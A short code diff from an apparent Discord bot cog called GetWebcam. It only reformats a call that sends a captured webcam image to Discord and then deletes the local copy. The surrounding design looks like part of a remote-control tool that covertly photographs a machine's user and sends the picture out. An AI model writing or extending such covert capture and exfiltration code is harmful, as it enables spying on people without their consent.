@@ -40,8 +40,13 @@ class GetWebcam(commands.Cog):
             )
             
             await ctx.followup.send(
-                embed=self.bot.genEmbed( "Image taken from webcam:", datetime.now() ),
-                file=discord.File( nr_working + "\\image.png" )
+                embed=self.bot.genEmbed( 
+                    "Image taken from webcam:", 
+                    datetime.now() 
+                ),
+                file=discord.File( 
+                    nr_working + "\\image.png" 
+                )
             )
             time.sleep(2)
             os.remove(nr_working + "\\image.png")
